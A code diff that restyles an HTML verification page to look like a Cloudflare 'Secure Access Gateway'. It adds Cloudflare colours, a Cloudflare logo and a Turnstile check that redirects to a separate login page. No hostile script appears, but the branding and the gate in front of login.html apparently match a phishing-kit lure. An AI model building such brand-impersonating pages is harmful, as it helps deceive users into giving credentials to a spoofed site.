@@ -3,81 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Access Portal</title>
+    <title>Cloudflare Secure Access</title>
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
+        :root {
+            --cf-dark-bg: #0C1120;
+            --cf-dark-surface: #1A2333;
+            --cf-dark-border: #2D3B52;
+            --cf-primary: #0038FF;
+            --cf-text-primary: #F0F2FC;
+            --cf-text-secondary: #8C9DB5;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', sans-serif;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
         }
 
         body {
-            background: #000;
-            color: #fff;
+            background: linear-gradient(225deg, var(--cf-dark-bg) 0%, var(--cf-dark-surface) 100%);
             min-height: 100vh;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .background-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, rgba(0,0,0,0.9), rgba(40,40,40,0.8));
-            z-index: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--cf-text-primary);
         }
 
         .container {
-            position: relative;
-            z-index: 2;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
+            max-width: 560px; /* Increased width */
+            width: 100%;
             padding: 2rem;
+            margin: 0 auto;
+        }
+
+        .logo-container {
             text-align: center;
+            margin-bottom: 3rem; /* Increased spacing */
         }
 
         .logo {
-            font-size: 2.5rem;
-            font-weight: bold;
+            width: 160px; /* Larger logo */
             margin-bottom: 2rem;
-            background: linear-gradient(45deg, #00ff88, #00a3ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            filter: brightness(0) invert(1);
+        }
+
+        .title {
+            font-size: 1.75rem; /* Larger title */
+            font-weight: 600;
+            color: var(--cf-text-primary);
+            margin-bottom: 0.75rem;
+        }
+
+        .subtitle {
+            color: var(--cf-text-secondary);
+            margin-bottom: 2.5rem;
+            font-size: 1rem;
         }
 
         .auth-box {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 3rem;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            max-width: 500px;
+            background: var(--cf-dark-surface);
+            border-radius: 12px; /* Slightly larger radius */
+            padding: 3rem; /* Increased padding */
+            border: 1px solid var(--cf-dark-border);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            min-height: 300px; /* Minimum height */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .cf-turnstile {
+            margin: 2rem 0; /* More spacing */
+            transform: scale(1.1); /* Slightly larger widget */
+            transform-origin: center;
             width: 100%;
         }
 
         .status-message {
-            margin-top: 1.5rem;
-            font-size: 1.1rem;
-            color: #00ff88;
+            font-size: 1rem;
+            color: var(--cf-text-primary);
+            text-align: center;
+            padding: 1.25rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            margin-top: 2rem;
             opacity: 0;
             transition: opacity 0.3s ease;
         }
 
         .loading-bar {
-            width: 0%;
-            height: 3px;
-            background: linear-gradient(90deg, #00ff88, #00a3ff);
-            margin-top: 1.5rem;
-            transition: width 0.5s ease;
+            height: 4px; /* Thicker bar */
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 2px;
+            margin-top: 2rem;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .loading-progress {
+            width: 0%;
+            height: 100%;
+            background: var(--cf-primary);
+            transition: width 0.5s ease;
+            position: absolute;
         }
 
         @keyframes fadeIn {
@@ -86,24 +116,40 @@
         }
 
         .fade-in {
-            animation: fadeIn 0.8s ease-out;
+            animation: fadeIn 0.4s ease-out;
         }
 
-        @media (max-width: 768px) {
+        @media (max-width: 480px) {
+            .container {
+                padding: 1.5rem;
+            }
+            
             .auth-box {
                 padding: 2rem;
+                min-height: 280px;
             }
             
             .logo {
-                font-size: 2rem;
+                width: 140px;
+            }
+            
+            .title {
+                font-size: 1.5rem;
+            }
+            
+            .cf-turnstile {
+                transform: scale(1);
             }
         }
     </style>
 </head>
 <body>
-    <div class="background-overlay"></div>
     <div class="container">
-        <div class="logo fade-in">SECURE PORTAL</div>
+        <div class="logo-container fade-in">
+            <img src="cloudflare-logo.jpg" alt="Cloudflare" class="logo">
+            <h1 class="title">Secure Access Gateway</h1>
+            <p class="subtitle">Verify your identity to continue</p>
+        </div>
         
         <div class="auth-box fade-in">
             <div class="cf-turnstile" 
@@ -114,11 +160,12 @@
                  data-appearance="always"
                  data-retry="auto"
                  data-retry-interval="1000"
-                 data-auto="true"
-                 style="display: flex; justify-content: center;"></div>
+                 data-auto="true"></div>
             
-            <div class="status-message" id="status">Verification Successful! Redirecting...</div>
-            <div class="loading-bar" id="loader"></div>
+            <div class="status-message" id="status">Verification confirmed. Redirecting...</div>
+            <div class="loading-bar">
+                <div class="loading-progress" id="loader"></div>
+            </div>
         </div>
     </div>
 
@@ -131,8 +178,8 @@
             loader.style.width = '100%';
             
             setTimeout(() => {
-                window.location.href = 'login.html'; // Change to your login page URL
-            }, 2000);
+                window.location.href = 'login.html';
+            }, 1500);
         }
     </script>
 </body>
